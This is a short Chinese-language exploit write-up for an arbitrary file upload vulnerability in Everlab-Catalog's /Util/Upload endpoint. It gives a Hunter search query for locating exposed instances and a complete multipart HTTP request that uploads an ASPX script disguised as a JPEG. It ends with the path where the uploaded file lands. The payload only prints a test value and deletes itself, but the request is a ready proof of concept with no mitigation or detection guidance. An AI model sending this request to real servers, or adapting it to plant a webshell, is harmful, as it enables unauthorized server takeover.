# 一、漏洞简介
Everlab-Catalog Util/Upload存在文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ Everlab-Catalog 

# 三、资产测绘
+ Hunter`web.body="Everlab-Catalog"`
+ 特征

![](images/1703513896192-bf6c7b0e-1d5e-4545-b55a-407ad59256a2.png)

# 四、漏洞复现
```java
POST /Util/Upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Length: 345
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------7153094104923513110228090822
Origin: null
Upgrade-Insecure-Requests: 1
Connection: close

-----------------------------7153094104923513110228090822
Content-Disposition: form-data; name="Filedata"; filename="ckviaxtcmw.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
-----------------------------7153094104923513110228090822--

```

![](images/1718613623028-37a8a362-4111-41bf-8f0e-32e4c63de1ef.png)

```java
/upload/2024/06/17/a005b1e3-a03e-4faf-bbdf-955c0a26bc29.aspx
```

![](images/1718613639149-84569b71-1a54-4641-bf0f-9337835edb3f.png)

